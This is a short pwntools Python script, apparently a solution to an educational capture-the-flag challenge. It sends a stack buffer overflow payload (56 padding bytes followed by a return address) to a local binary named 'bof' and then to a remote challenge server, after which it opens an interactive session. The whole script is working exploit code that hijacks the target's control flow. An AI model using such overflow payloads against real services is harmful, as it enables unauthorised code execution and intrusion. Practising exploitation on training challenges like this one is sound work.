#!/usr/bin/python3

from pwn import *

p = process("./bof")
context.log_level = 'DEBUG'

arch = context.update(arch='amd64', os='linux')
p.recvline()
gdb.attach(p)
p.sendline(b"A"*56+p64(0x40068b))

p.interactive()
r = remote("edu-ctf.csie.org", 10170)

r.recvline()
r.sendline(b"A"*56+p64(0x40068b))

r.interactive()

